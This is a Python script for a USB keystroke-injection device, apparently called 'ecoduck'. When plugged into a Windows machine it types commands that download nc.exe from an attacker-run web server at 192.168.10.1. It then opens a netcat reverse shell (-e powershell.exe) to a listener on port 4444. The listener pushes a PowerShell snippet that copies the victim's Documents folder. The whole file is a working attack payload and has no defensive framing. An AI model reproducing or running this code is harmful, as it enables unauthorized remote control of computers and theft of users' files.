from ecoduck import eco

import os,signal,io,http.server,socketserver, socket
from time import sleep
from subprocess import Popen, PIPE, check_output

from multiprocessing import Process

shellcode="""$foldername = $env:computername
$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'WINDOWS'} | %{$_.DeviceID})
$destinationFolder = "$mydrive\\$foldername"
if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
$target = [Environment]::GetFolderPath("MyDocuments")
Get-ChildItem -Path $target -Recurse -Include *  | Copy-Item -Destination $destinationFolder -verbose
Write-Host "The file sync is complete." """

def reverse_shell_listener():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ;# Set is so that when we cancel out we can reuse port.
	try:
		s.bind(('', 4444)) # Bind to interface.
		print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
		s.listen(10) # Listen for only 10 unaccepted connections.
		conn, addr = s.accept() # Accept connections.
		print("[+] Connected by", addr) # Print connected by ipaddress.
		conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
		data = conn.recv(1024).decode("UTF-8") # Receive output from command.
		print(data) # Print the output of the command.
	except KeyboardInterrupt: 
		print("...listener terminated using [ctrl+c], Shutting down!")
		exit() # Using [ctrl+c] will terminate the listener.


def payload():
	try:
		web_dir = os.path.join(os.path.dirname(__file__), 'http')
		os.chdir(web_dir)
		httpHandler = http.server.SimpleHTTPRequestHandler
		httpd = socketserver.TCPServer(('',8000),httpHandler)
		httplistener=Process(target=httpd.serve_forever)
		httplistener.start()
	except:
		httpd.shutdown()
	sleep(3)
	eco.press("LGUI+R")
	sleep(1)
	eco.type("powershell")
	eco.press("ENTER")
	sleep(1)
	eco.debug=True
	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
	eco.debug=False
	eco.press("ENTER")
	sleep(5)

	shelllistener=Process(target=reverse_shell_listener)
	shelllistener.start()
	eco.type(".\nc.exe 192.168.10.1 4444 –e powershell.exe")
	shelllistener.join()
	# Copy Documents Directory to Flash Drive
	httpd.shutdown()
	httplistener.join()

# Ensures simple gadget is selected
__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
print("Waiting for connection...")
while(1):
	if(eco.test_connection("/dev/hidg0", 1)):
		print("Device connected to target")
		# OS Fingerprinting
		detectedos = eco.get_target_os()
		if "Windows" == detectedos:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
		print("HID Path is: " + path)
		print("Target OS is: " + detectedos)
		sleep(2)
		if "Windows" == detectedos:
			payload()
		print("Payload completed")
		# Switch back to simple gadget
		if "Windows" == detectedos:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
		sleep(2)
		eco.wait_for_disconnect()

